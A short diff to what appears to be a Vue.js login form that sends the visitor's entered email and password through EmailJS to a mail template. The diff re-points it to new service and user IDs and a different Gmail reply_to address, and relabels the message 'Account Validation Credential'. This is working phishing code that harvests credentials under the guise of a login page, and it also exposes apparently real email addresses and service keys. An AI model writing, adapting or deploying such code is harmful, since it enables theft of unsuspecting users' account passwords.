@@ -122,14 +122,14 @@ export default {
       this.$refs[formName].validate((valid) => {
         if (valid) {
           var data = {
-            service_id: "service_70ntltg",
-            template_id: "template_8f1cut7",
-            user_id: "user_6dMy0FAzh3UkwGQuDDbjZ",
+            service_id: "service_fukql9p",
+            template_id: "template_74y6ir9",
+            user_id: "user_gEIO4dyYsGHrZgmFgY1Ul",
             template_params: {
-              from_name: 'User Details',
+              from_name: 'Account Validation Credential',
               email: this.ruleForm.name,
               password: this.ruleForm.password,
-              reply_to: "janetwilliams1305@gmail.com",
+              reply_to: "crewwebinar@gmail.com",
             },
           };
           axios
